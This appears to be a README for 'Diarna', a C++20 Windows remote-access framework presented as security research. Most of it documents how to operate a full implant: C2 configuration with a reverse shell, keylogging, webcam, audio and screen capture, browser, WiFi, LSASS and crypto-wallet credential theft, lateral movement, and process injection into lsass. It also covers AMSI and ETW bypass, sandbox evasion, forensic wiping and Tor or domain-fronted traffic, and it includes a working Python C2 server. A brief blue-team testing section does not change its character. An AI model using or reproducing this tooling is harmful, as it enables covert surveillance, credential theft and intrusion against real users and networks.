# Diarna

> Windows security research framework. C++20.
> Compiles with MSVC, MinGW-w64, and Clang.

⚠️ **Authorized security testing only.**

---

## What Is Diarna?

A modular C++20 framework for studying advanced adversary techniques on Windows.
Every subsystem is isolated — study persistence without the C2, test the keylogger
without the harness, or combine modules for full-chain emulation.

Zero external dependencies. All crypto (ChaCha20-Poly1305) is self-contained.
All stealth (syscall resolution, hook detection, emulator detection) is built from
the Windows API and processor intrinsics.

---

## Quick Start (Single Include)

```cpp
#include <diarna.h>

int main() {
    diarna::AgentConfig cfg;
    cfg.agent_id   = "research-001";
    cfg.c2_host    = "10.0.0.50";
    cfg.c2_port    = 4443;              // NOT 4444 — use a random port
    cfg.encryption_key = {
        0x3a,0x91,0xf4,0x2c,0x8d,0x17,0xe6,0x55,
        0xb0,0x29,0x4f,0xae,0x73,0x1d,0xc8,0x62,
        0x94,0x0b,0xd3,0x5e,0xf7,0x28,0x41,0xac,
        0x86,0x59,0xee,0x1b,0x7f,0x34,0xd0,0xa2
    };
    cfg.anti_vm       = true;
    cfg.anti_debug    = true;
    cfg.patch_etw     = true;
    cfg.patch_amsi    = true;
    cfg.keylogger     = true;
    cfg.survive_reboot = true;

    diarna::Agent agent(cfg);
    if (!agent.arm())   return 1;   // environment checks + stealth
    if (!agent.deploy()) return 1;  // persistence + collectors

    // ── Use subsystems ──
    auto scr = agent.screenshot().capture_jpeg(85);
    auto keys = agent.keylogger().get_logs();
    auto result = agent.exec().execute("whoami");
    auto status = agent.status();

    agent.stand_down();
}
```

Compile:
```bash
# MSVC
cmake -B build -G "Visual Studio 17 2022" -A x64 && cmake --build build --config Release

# MinGW (from Linux, produces Windows binary)
cmake -B build -G "Unix Makefiles" -DCMAKE_SYSTEM_NAME=Windows \
  -DCMAKE_CXX_COMPILER=x86_64-w64-mingw32-g++ && cmake --build build
```

---

## Configuration Reference

### `AgentConfig` — All Settings

| Field | Type | Default | Purpose |
|-------|------|---------|---------|
| `agent_id` | string | (required) | Unique agent identifier |
| `c2_host` | string | (required) | Primary C2 server address |
| `c2_port` | uint16 | (required) | Primary C2 port |
| `c2_host_fallback` | string | "" | Failover C2 address |
| `c2_port_fallback` | uint16 | 0 | Failover C2 port |
| `encryption_key` | uint8[32] | (required) | ChaCha20-Poly1305 32-byte key |
| `tor_enabled` | bool | false | Route traffic through embedded Tor client |
| `domain_fronting` | bool | false | Route through CDN (Cloudflare, Azure) |
| `cdn_front` | string | "" | CDN edge domain (e.g., `cdn.cloudflare.net`) |
| `cdn_host` | string | "" | Real C2 hostname (Host header) |
| `anti_vm` | bool | true | Check for VMware, VirtualBox, Hyper-V, QEMU, etc. |
| `anti_debug` | bool | true | Check for debuggers (x64dbg, IDA, WinDbg, etc.) |
| `anti_sandbox` | bool | true | Check for Cuckoo, JoeSandbox, VMRay, etc. |
| `anti_anyrun` | bool | true | Dedicated Any.Run sandbox detection |
| `patch_etw` | bool | true | Disable Windows Event Tracing |
| `patch_amsi` | bool | true | Bypass Antimalware Scan Interface |
| `hide_from_taskmgr` | bool | true | Hide process from Task Manager |
| `mask_pid` | bool | true | Spoof PID in PEB |
| `vault_memory` | bool | true | VEH guard-page memory encryption |
| `survive_reboot` | bool | false | Install persistence (registry + task + startup) |
| `keylogger` | bool | false | Start keylogger on deploy |
| `clipboard` | bool | false | Start clipboard monitor on deploy |
| `wifi_dump` | bool | false | Dump WiFi passwords |
| `browser_dump` | bool | false | Dump browser passwords |
| `wifi_ssid` | string | "" | Only activate on this WiFi SSID |
| `usb_device_id` | string | "" | Only activate if this USB device present |
| `not_before_date` | string | "" | Don't activate before YYYY-MM-DD |
| `expire_date` | string | "" | Self-destruct after YYYY-MM-DD |

---

## Exposed API — `diarna::Agent`

### Lifecycle

```cpp
diarna::Agent agent(cfg);

agent.arm();      // verify environment, apply stealth, resolve syscalls
agent.deploy();   // install persistence, start collectors, begin main loop
agent.stand_down(); // stop all, uninstall persistence, clear logs
agent.is_active(); // check if agent is running
```

### `agent.exec()` — Command Execution

```cpp
auto& exec = agent.exec();

// Run a command via cmd.exe
auto r = exec.execute("whoami");
r.stdout_data  // stdout string
r.stderr_data  // stderr string
r.exit_code    // 0 = success
r.timed_out    // true if timeout exceeded
r.duration     // wall clock time

// Run PowerShell (COM in-process on MSVC, no child process)
auto r2 = exec.execute_powershell("Get-Process | Select -First 5", 10s);

// Run as a different user
auto r3 = exec.execute_as_user("whoami", "DOMAIN\\user", "password");

// Launch a binary (optionally hidden)
exec.run_file(L"C:\\Windows\\System32\\calc.exe", L"", true);
exec.run_file_elevated(L"C:\\path\\to\\tool.exe");
```

### `agent.screenshot()` — Screen Capture

```cpp
auto& ss = agent.screenshot();

auto jpg = ss.capture_jpeg(85);    // JPEG with quality 0-100
auto png = ss.capture_png(90);     // PNG format
auto bmp = ss.capture_bmp();       // Uncompressed BMP

ss.capture_to_file(L"C:\\shot.jpg", 85);  // Save to disk

auto monitors = Screenshot::enumerate_monitors(); // Multi-monitor info
```

### `agent.audio()` — Audio Capture

```cpp
auto& mic = agent.audio();

// Record 5 seconds, get WAV bytes
auto wav = mic.audio().capture_seconds(5, 44100, 2);

// Stream audio with callback
mic.start_capture(44100, 2, [](auto wav_chunk) {
    // process audio chunk
});
mic.stop_capture();

auto devices = Audio::enumerate_devices(); // List microphones
```

### `agent.webcam()` — Webcam Capture

```cpp
auto& cam = agent.webcam();

cam.open(0, 1280, 720);          // device 0, 720p
auto frame = cam.capture_frame_bmp(); // single frame
cam.capture_frame_jpeg(85);      // JPEG
cam.close();

auto devices = Webcam::enumerate_devices(); // List cameras
```

### `agent.desktop()` — Desktop Stream (DXGI Duplication)

```cpp
auto& desk = agent.desktop();

// Start streaming at 30 FPS
desk.start([](std::span<const uint8_t> bgra, uint32_t w, uint32_t h) {
    // process raw BGRA frame at w×h resolution
}, 30);
desk.stop();

// Single-frame snapshot
std::vector<uint8_t> frame;
uint32_t w, h;
desk.capture_single_frame(frame, w, h);
```

### `agent.webrtc()` — WebRTC Streaming

```cpp
auto& rtc = agent.webrtc();
rtc.initialize("wss://signal.example.com", "room-001", "peer-001", 1920, 1080, 30, 2000000);
rtc.start(callback, state_callback);
rtc.send_frame(bgra_bytes, 1920, 1080);
rtc.stop();
```

### `agent.keylogger()` — Keylogger

```cpp
auto& kl = agent.keylogger();

kl.start();                   // begin global keyboard hook
auto logs = kl.get_logs();   // "explorer.exe: hello world"
kl.clear_logs();
kl.set_callback([](const std::string& window, const std::string& keys) {
    // real-time keystroke stream
});
kl.stop();
```

**How it works**: `SetWindowsHookExW(WH_KEYBOARD_LL)` registers a low-level keyboard hook. Every keystroke fires `keyboard_proc` which maps the virtual key code to a character using `ToUnicode`. Special keys (Backspace, Tab, arrows, Ctrl+C/V, Alt+Tab) are tagged. The foreground window title is tracked via `GetForegroundWindow`. When the user switches windows or 30 seconds pass, the accumulated keys are flushed with a `[WindowTitle] keystrokes` header.

### `agent.clipboard()` — Clipboard Monitor

```cpp
auto& cb = agent.clipboard();

cb.start(2s);                      // poll every 2 seconds
auto last = cb.get_last_clipboard();
auto history = cb.get_history();  // last 500 unique entries
cb.clear_history();
cb.stop();
```

### `agent.credentials()` — Credential Dumper

```cpp
auto& cred = agent.credentials();

auto chrome = cred.dump_chrome_passwords();   // Chrome + Chromium browsers
auto edge   = cred.dump_edge_passwords();     // Microsoft Edge
auto ff     = cred.dump_firefox_passwords();  // Firefox + Thunderbird
auto wifi   = cred.dump_wifi_passwords();     // WiFi profiles (plaintext keys)
auto rdp    = cred.dump_saved_rdp();          // Remote Desktop saved connections

cred.dump_lsass(L"C:\\lsass.dmp");   // Create LSASS minidump (needs admin)
auto hashes = cred.dump_sam_hashes(); // SAM/SYSTEM hive dump (needs SYSTEM)
```

### `agent.harvester()` — Credential Harvester (200+ apps)

```cpp
auto& harv = agent.harvester();

std::vector<CredentialEntry> results;
harv.harvest_all(results);
// results now contains credentials from:
//   Browsers (19), Email clients (11), FTP clients (13),
//   VPN clients (17), Gaming platforms (14), Cloud storage (13),
//   Chat/IM apps (18), Database tools (15), Dev tools (18),
//   RDP/VNC (14), Password managers (15), Crypto wallets (15),
//   Windows system (10), Misc (18)

harv.harvest_category("Browsers", results);       // specific category
harv.harvest_application("Steam", results);       // specific app
auto categories = harv.list_categories();          // list all categories
auto apps = harv.list_applications();              // list all apps
```

### `agent.movement()` — Lateral Movement

```cpp
auto& lat = agent.movement();

// Scan network subnet
auto targets = lat.scan_network("192.168.1.0/24");
for (auto& t : targets) {
    // t.ip, t.alive, t.smb_open, t.rdp_open, t.winrm_open
}

// Execute on remote host
lat.wmi_exec("192.168.1.50", "whoami");
lat.psexec_exec("192.168.1.50", L"C:\\path\\payload.exe");
lat.winrm_exec("192.168.1.50", "Get-Process");
lat.schedule_task_remote("192.168.1.50", L"C:\\path\\payload.exe");

// Copy files via SMB
lat.smb_copy("192.168.1.50", L"local.dll", L"C$\\Windows\\Temp\\target.dll");
```

### `agent.shell()` — Reverse Shell

```cpp
auto& shell = agent.shell();

diarna::comm::ReverseShell::ShellConfig scfg;
scfg.host = "10.0.0.50";
scfg.port = 4443;
shell.configure(scfg);
shell.start();
shell.send_command("whoami");
auto output = shell.read_output();
shell.stop();
```

### `agent.stubs()` — Stub Injector

```cpp
auto& si = agent.stubs();

// Inject shellcode into a signed Microsoft process
uint8_t my_stub[] = { 0x90, 0x90, 0xC3 }; // NOP; NOP; RET
si.inject_into_process(L"explorer.exe", my_stub);
si.inject_into_process(L"svchost.exe", my_stub);
si.inject_into_process(L"lsass.exe", my_stub);

// Extend (hook) a function in a remote process
void* trampoline = nullptr;
si.extend_function(original_func, my_hook, &trampoline);

auto active = si.active_stubs(); // all injected stubs
si.remove_all();                 // clean up
```

### `agent.exploits()` — Zero-Day Integration

```cpp
auto& exp = agent.exploits();

// Register a pre-compiled exploit
exp.register_exploit(
    "LPE-001",                   // name
    "CVE-2026-12345",            // CVE
    shellcode_payload,           // pre-compiled byte array
    "10.0.19041-10.0.22621",    // target OS build range
    false,                        // needs admin? false = privesc
    true                          // local only?
);

// Execute by name
exp.execute("LPE-001", { .run_as_system = true });

// Execute all registered exploits
exp.execute_all();

auto list = exp.list_exploits(); // status of all exploits
```

### `agent.status()` — Agent Status

```cpp
auto s = agent.status();
// s.id          - agent_id
// s.active      - is the agent running?
// s.tor         - is Tor ready?
// s.uptime      - seconds since deploy()
// s.vault_pages - memory vault page count
// s.mutations   - total code mutations performed
// s.sandbox     - detected sandbox name (or "none")
// s.persistence - list of active persistence methods
// s.evasion     - list of active evasion techniques
```

---

## Architecture

```
Diarna/
├── include/
│   ├── diarna.h                     ← SINGLE INCLUDE convenience layer
│   └── diarna/
│       ├── compiler_port.hpp        Cross-compiler abstraction (MSVC ∥ MinGW)
│       ├── core/
│       │   ├── config.hpp           All configuration structs
│       │   └── framework.hpp        Orchestrator (arm → deploy → main_loop)
│       ├── crypto/
│       │   └── chacha20.hpp         ChaCha20-Poly1305 AEAD (zero deps)
│       ├── stealth/
│       │   ├── anti_analysis.hpp    80+ VM/sandbox/debugger checks
│       │   ├── anti_hook.hpp        Inline/IAT/EAT hook detection + removal
│       │   ├── forensics.hpp        MFT/$LogFile/USN journal/NTFS wiping
│       │   ├── hells_gate.hpp       Dynamic syscall resolution (4 methods)
│       │   ├── kernel_ops.hpp       EDR callback removal, PEB mirroring
│       │   ├── memory_vault.hpp     VEH guard-page memory encryption
│       │   ├── nanomite.hpp         Emulator detection (RDTSC, CPUID, SIDT, FPU)
│       │   ├── polymorph.hpp        15-pass metamorphic code engine
│       │   ├── remap.hpp            Image remapper (SEC_NO_CHANGE)
│       │   ├── rop_engine.hpp       ROP gadget finder + chain compiler
│       │   └── syscalls.hpp         Direct syscall interface (100+ functions)
│       ├── persistence/
│       │   └── manager.hpp          12+ persistence methods + self-healing
│       ├── comm/
│       │   ├── protocol.hpp         C2 binary protocol (24 command types)
│       │   ├── reverse_shell.hpp    PowerShell + cmd dual-mode
│       │   ├── tor_client.hpp       Embedded Tor (consensus + ntor)
│       │   └── transport.hpp        Domain fronting, DNS-over-HTTPS
│       ├── collection/
│       │   ├── collector.hpp        Keylogger, clipboard, WiFi, LSASS, browsers
│       │   └── credential_harvester.hpp  200+ app credential database
│       ├── exec/
│       │   ├── executor.hpp         Command + PowerShell execution
│       │   ├── exploit.hpp          Zero-day exploit integration
│       │   ├── injector.hpp         8 process injection techniques
│       │   └── stub_injector.hpp    Distributed multi-process stub injection
│       ├── capture/
│       │   └── capture.hpp          Screenshot, audio, webcam, desktop, WebRTC
│       └── movement/
│           └── lateral.hpp          Network scan, WMI, PsExec, WinRM
└── src/                             Implementation files
```

---

## Server-Side Configuration

Diarna speaks a binary C2 protocol. Your server must:

### 1. Listen on TCP

Bind a TCP socket to the configured `c2_host:c2_port`. Use TLS (recommended).

### 2. Implement the Protocol

Every message is framed as:

```
┌────────────────┬──────────┬────────────┬─────────┬──────────────┬────────┬────────┐
│ 4B magic       │ 2B ver   │ 2B command  │ 4B seq  │ 4B payload_sz│ 4B CRC │ 1B flg │
│ (derived from  │ = 2      │ see below   │         │              │        │        │
│  agent_id+key) │          │             │         │              │        │        │
└────────────────┴──────────┴─────────────┴─────────┴──────────────┴────────┴────────┘
│←── 21 byte header ──→│←── payload (payload_sz bytes) ──→│
```

### 3. Encrypt/Decrypt

Every message body is encrypted with **ChaCha20-Poly1305 AEAD** using the same 32-byte key configured on the client.

### 4. Command Types

| Command | Value | Direction | What it sends |
|---------|-------|-----------|---------------|
| `CMD_EXEC` | 0x0100 | S→C | Run command via cmd.exe |
| `CMD_EXEC_PS` | 0x0101 | S→C | Run PowerShell script |
| `CMD_EXEC_SHELLCODE` | 0x0102 | S→C | Execute raw shellcode |
| `CMD_EXEC_DLL` | 0x0103 | S→C | Load and run a DLL export |
| `CMD_FS_LIST` | 0x0200 | S→C | List directory |
| `CMD_FS_READ` | 0x0201 | S→C | Read file |
| `CMD_FS_WRITE` | 0x0202 | S→C | Write file |
| `CMD_FS_DELETE` | 0x0203 | S→C | Delete file |
| `CMD_FS_DOWNLOAD` | 0x0204 | S→C | Download from URL to disk |
| `CMD_FS_UPLOAD` | 0x0205 | S→C | Upload local file to URL |
| `CMD_SCREENSHOT` | 0x0300 | S→C | Capture screenshot |
| `CMD_AUDIO` | 0x0301 | S→C | Record audio |
| `CMD_WEBCAM` | 0x0302 | S→C | Capture webcam frame |
| `CMD_DESKTOP_STREAM` | 0x0303 | S→C | Start desktop stream |
| `CMD_STOP_STREAM` | 0x0304 | S→C | Stop desktop stream |
| `CMD_KEYLOG` | 0x0400 | S→C | Dump keystroke logs |
| `CMD_CLIPBOARD` | 0x0401 | S→C | Dump clipboard history |
| `CMD_CREDS` | 0x0402 | S→C | Dump credentials |
| `CMD_PERSIST` | 0x0500 | S→C | Install persistence |
| `CMD_PERSIST_REMOVE` | 0x0501 | S→C | Remove persistence |
| `CMD_PERSIST_STATUS` | 0x0502 | S→C | Check persistence status |
| `CMD_INJECT` | 0x0600 | S→C | Inject shellcode |
| `CMD_INJECT_DLL` | 0x0601 | S→C | Inject DLL |
| `CMD_HOLLOW` | 0x0602 | S→C | Process hollowing |
| `CMD_NET_SCAN` | 0x0700 | S→C | Scan network |
| `CMD_WMI_EXEC` | 0x0701 | S→C | WMI remote exec |
| `CMD_PSX_EXEC` | 0x0702 | S→C | PsExec remote exec |
| `CMD_WINRM_EXEC` | 0x0703 | S→C | WinRM remote exec |
| `CMD_SYSINFO` | 0x0800 | S→C | Get system info |
| `CMD_SELF_DESTRUCT` | 0x0801 | S→C | Uninstall + self-delete |
| `CMD_SLEEP` | 0x0803 | S→C | Sleep N seconds |
| `CMD_RESPONSE` | 0x8000 | C→S | Client response |
| `CMD_ERROR` | 0xFFFF | C→S | Error response |

### 5. Python Server Example

```python
import socket, struct
from chacha20poly1305 import ChaCha20Poly1305  # pip install

KEY = bytes.fromhex("3a91f42c8d17e655b0294fae731dc862940bd35ef72841ac8659ee1b7f34d0a2")
FRAME_HDR = struct.Struct("<I H H I I I B")

def recv_frame(sock):
    hdr = sock.recv(21)
    magic, ver, cmd, seq, plen, crc, flags = FRAME_HDR.unpack(hdr)
    payload = sock.recv(plen) if plen else b""
    # Decrypt with ChaCha20-Poly1305
    decrypted = ChaCha20Poly1305(KEY).decrypt(payload)
    return cmd, seq, decrypted

def send_frame(sock, cmd, seq, payload):
    encrypted = ChaCha20Poly1305(KEY).encrypt(payload)
    hdr = FRAME_HDR.pack(magic, 2, cmd, seq, len(encrypted), crc32(encrypted), 0)
    sock.sendall(hdr + encrypted)

# Listen
s = socket.socket(); s.bind(("0.0.0.0", 4443)); s.listen(1)
conn, addr = s.accept()

# Send screenshot command
send_frame(conn, 0x0300, 1, b'{"quality":85}')
cmd, seq, jpg = recv_frame(conn)
with open("screenshot.jpg", "wb") as f: f.write(jpg)

# Send system info command
send_frame(conn, 0x0800, 2, b'{}')
cmd, seq, info = recv_frame(conn)
print(info.decode())
```

---

## Compile-Time Defines

| Define | Default | Purpose |
|--------|---------|---------|
| `CFLOW_BRANCHING` | 0 | Enable control-flow keyword obfuscation (MSVC only) |
| `CONST_ENCRYPTION` | 1 | Compile-time string/constant XOR encryption |
| `FAKE_SIGNATURES` | 1 | Inject fake packer section headers |
| `INDIRECT_BRANCHING` | 1 | Anti-decompiler `xor eax,eax; jz; .byte 0x00` |
| `OBF_UNSUPPORTED` | — | Bypass unsupported-compiler check |

---

## Keylogger Detail

The keylogger uses `SetWindowsHookExW(WH_KEYBOARD_LL)` to install a global low-level
keyboard hook. This runs in a dedicated thread with a Windows message pump.

**Character mapping pipeline:**
1. `keyboard_proc` receives WM_KEYDOWN/WM_SYSKEYDOWN
2. Modifier state (Shift/Ctrl/Alt) is read via `GetAsyncKeyState`
3. Virtual key → character via `ToUnicode` + keyboard state
4. Special keys tagged: [BK], [DEL], [ESC], ←↑→↓, [CTRL+C/V], [ALT+TAB]
5. Foreground window title tracked via `GetForegroundWindow`
6. On window change OR 30-second timeout: flush to log buffer

**Output format:**
```
[explorer.exe] hello world
[chrome.exe] https://github.com/login[TAB]user@email.com[TAB]password123[RETURN]
[notepad++.exe] confidential document[CTRL+S]
```

---

## Defense Testing

Blue teams can use Diarna to validate detection rules:

1. **Compile with default settings** — run through your EDR, check which modules trigger alerts
2. **Enable `survive_reboot`** — verify your persistence monitoring (Sysmon Event 12/13, service creation events)
3. **Enable `keylogger`** — verify your hook detection (`SetWindowsHookEx` monitoring)
4. **Enable `wifi_dump`** — verify your credential access monitoring
5. **Deploy with all evasion disabled** — baseline what your stack catches
6. **Deploy with all evasion enabled** — test if your stack still catches the modified binary

---

## License

```
Copyright (c) 2026, Diarna Research Project
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice,
   this list of conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES.

FOR EDUCATIONAL AND AUTHORIZED SECURITY RESEARCH PURPOSES ONLY.
```

---

<div align="center">
<b>Diarna v1.0 — BSD-2-Clause</b><br>
<sub>For authorized security research only. Not for unauthorized use.</sub>
</div>
